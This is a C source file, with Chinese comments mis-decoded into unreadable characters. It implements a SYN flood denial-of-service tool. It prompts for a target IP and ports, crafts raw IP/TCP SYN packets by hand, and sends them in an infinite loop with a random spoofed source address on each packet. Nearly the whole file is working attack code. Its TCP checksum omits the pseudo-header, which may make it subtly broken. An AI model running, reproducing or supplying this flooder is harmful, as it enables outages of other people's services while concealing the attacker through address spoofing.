//����syn����

#include <errno.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

//�ܾ����񹥻� dos
void send_data(int sfd, struct sockaddr_in* addr, int port);

int main(int argc, char* argv[]) {
	char ip[32];//Ŀ��ip
	int dport;//Ŀ��˿�
	int sport;//Դ�˿�
	int sfd;
	struct sockaddr_in addr;

	memset(&addr, 0x00, sizeof(struct sockaddr_in));//���addr
	printf("Ŀ��IP: "); scanf("%s", ip);
	printf("Ŀ��˿ڣ� "); scanf("%d", &dport);
	printf("Դ�˿ڣ� "); scanf("%d", &sport);

	addr.sin_family = AF_INET;
	inet_aton(ip, &addr.sin_addr);
	addr.sin_port = htons(dport);//�˿�
	if ((sfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1) {
		perror("socket");
		exit(EXIT_FAILURE);
	}
	int on = 1;
	setsockopt(sfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));//tcp֮��ԭ��û��ipͷ����������Ҫ��ȡipͷ����
	send_data(sfd, &addr, sport);//����
}

u_short checksum(u_short* data, int len) {//����ͼ���
	u_long sum = 0;

	for (; len > 1; len -= 2) {
		sum += *data++;
		if (sum & 0x80000000) {
			sum = (sum & 0xffff) + (sum >> 16);
		}
	}

	if (len == 1) { // ���ʣ��һ��
		u_short i = 0;
		*(u_char*)&i = *(u_char*)data;
		sum += i;
	}
	while (sum >> 16) { // ��16λ�����1����������
		sum = (sum & 0xffff) + (sum >> 16);
	}
	return (sum == 0xffff) ? sum : ~sum;
}


void send_data(int sfd, struct sockaddr_in* addr, int port) {
	char buf[100];//����ÿռ�
	struct iphdr* ip;//ipͷ��
	struct tcphdr* tcp;//tcpͷ��
	int head_len;//ͷ������

	head_len = sizeof(struct iphdr) + sizeof(struct tcphdr);//ipͷ+tcpͷ
	memset(buf, 0x00, sizeof(buf));


	ip = (struct iphdr*)buf;//��װip
	ip->version = IPVERSION;//ipv4
	ip->ihl = sizeof(struct ip) >> 2;//�ײ����ȣ�ȡ��ʱ��������λ��װ��ʱ�����Ҫ������λ
	ip->tos = 0;                //�������Ͳ�Ҫ д0 
	ip->tot_len = htons(head_len);//�ܳ��� ����Ϊ�գ�����tcp��ipͷ���Ĵ�С ����Ҫװ�����ֽ���
	ip->id = 0;//���ı�� ��������
	ip->frag_off = 0;//��ʶλ��Ҳ�ò���
	ip->ttl = MAXTTL;//����ʱ�� д���ʱ�����            
	ip->protocol = IPPROTO_TCP;  //�ϲ�Э�� tcp
	ip->check = 0;              //����������
	ip->daddr = addr->sin_addr.s_addr; //Ŀ���ַ ��addr��


	tcp = (struct tcphdr*)(buf + sizeof(struct iphdr));//��װtcp
	tcp->source = htons(port);//tcp��Դ�˿�
	tcp->dest = addr->sin_port; //Ŀ��˿�
	tcp->seq = random();//������������к�
	tcp->ack_seq = 0;//Ӧ���Ķ�����û�� ��0
	tcp->doff = 5;//��5
	tcp->syn = 1;//��1 ����

	while (1) {
		ip->saddr = random();//�������Դip
		tcp->check = checksum((u_short*)(buf + sizeof(struct iphdr)), sizeof(struct tcphdr));//tcpУ��ͼ���
		sendto(sfd, buf, head_len, 0, (struct sockaddr*)addr, (socklen_t)sizeof(struct sockaddr_in));//�׽��֣����ݣ����ݵĳ��ȣ�0�� Ŀ��λ�ã�Ŀ�곤��
	}
}
